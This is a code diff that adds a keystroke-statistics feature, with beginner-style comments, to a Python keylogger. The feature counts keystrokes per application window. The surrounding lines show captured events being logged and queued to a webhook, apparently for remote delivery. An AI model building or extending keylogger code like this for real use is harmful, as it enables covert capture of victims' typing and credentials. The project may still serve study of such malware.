@@ -104,6 +104,109 @@ class KeyType(Enum):
     UNKNOWN = auto()
 
 
+class Statistics:
+    """
+    Track keystroke statistics in real-time
+    """
+    def __init__(self):
+        """
+        Initialize all counters to zero
+
+        Think of these like scoreboards:
+        - total_keys: Running total of all keystrokes
+        - keys_per_app: How many keys per application
+        - special_key_count: How many special keys (like [ENTER], [SHIFT])
+        """
+        self.total_keys = 0                     # Total keystroke count
+        self.keys_per_app: dict[str, int] = {}  # Dictionary mapping app names to counts
+        self.special_key_count = 0              # Count of special vs regular keys
+    
+    def record_keystrokes(self, app_name: str | None, key_type: KeyType) -> None:
+        """
+        Called every time a keystroke happens.
+        Updates the stats in real-time.
+
+        Args:
+            app_name: Name of the application (e.g., "chrome.exe - Gmail")
+            key_type: Whether this was a CHAR, SPECIAL, or UNKNOWN key
+        """
+        # Increment total keystroke counter
+        self.total_keys += 1
+
+        if key_type == KeyType.SPECIAL:
+            self.special_key_count += 1
+
+        # Use a fallback app name when window tracking is unavailable
+        app_name = app_name or "Unknown"
+
+        if app_name not in self.keys_per_app:
+            self.keys_per_app[app_name] = 0
+
+        self.keys_per_app[app_name] += 1
+
+    def get_top_apps(self, limit: int = 5) -> list[tuple[str, int]]:
+        """
+        Return the top N applications by keystroke count.
+
+        This is like sorting a classroom by test scores, highest first.
+
+        
+        Args:
+            limit: How many top apps to return (default: top 5)
+            
+        Returns:
+            A list of (app_name, keystroke_count) sorted by count
+        """
+        # sorted() arranges items by a key
+        # key = lambda x: x[1] means "sort by the second value (the count)"
+        # reverse = True means highest to lowest
+        sorted_apps = sorted(
+            self.keys_per_app.items(),
+            key = lambda x: x[1],
+            reverse = True
+        )
+        return sorted_apps[:limit]  # Return only the top 'limit' apps
+
+    def to_string(self, uptime_seconds: float) -> str:
+        """
+        Format all statistics as a nice readable string.
+        This is what gets printed when keylogger stops.
+
+        Args:
+            uptime_seconds: How many seconds the keylogger ran
+
+        Returns:
+            A multi-line string with all stats formatted nicely
+        """
+        # Convert seconds to minutes:seconds format
+        # Example: 335 seconds becomes "5:35"
+        minutes = int(uptime_seconds) // 60
+        seconds = int(uptime_seconds) % 60
+        uptime_str = f"{minutes}:{seconds:02d}" # :02d means pad with zero to 2 digits
+
+        # Build the output string line by line
+        lines = [
+            "\n" + "="*50,
+            "KEYSTROKE STATISTICS",
+            f"Total keystrokes: {self.total_keys}",
+            f"Uptime: {uptime_str}",
+            f"Special keys pressed: {self.special_key_count}",
+        ]
+
+        # Add top applications section
+        if self.keys_per_app:
+            lines.append("Top applications:")
+            for app_name, count in self.get_top_apps(5):
+                lines.append(f" {app_name}: {count} keystrokes")
+        else:
+            lines.append("No keystrokes recorded")
+
+        lines.append("="*50)
+
+        # Join all lines with newlines and return as one big string
+        return "\n".join(lines)
+
+
 @dataclass
 class KeyloggerConfig:
     """
@@ -497,6 +600,8 @@ class Keylogger:
 
         self._current_window: str | None = None
         self._last_window_check = datetime.now()
+        self.start_time = datetime.now()
+        self.statistics = Statistics()
 
     def _update_active_window(self) -> None:
         """
@@ -584,6 +689,9 @@ class Keylogger:
 
         self.log_manager.write_event(event)
         self.webhook.add_event(event)
+        self.statistics.record_keystrokes(
+            self._current_window, key_type
+        )
 
     def _toggle_logging(self) -> None:
         """
@@ -659,6 +767,12 @@ class Keylogger:
 
         self.webhook.flush()
         self.log_manager.close()
+
+        # Calculate uptime: How long did the keylogger run?
+        uptime_seconds = (datetime.now() - self.start_time).total_seconds()
+        
+        # Print the statistics
+        print(self.statistics.to_string(uptime_seconds))
 
         print("[*] Logs saved to: "
               f"{self.config.log_dir}")
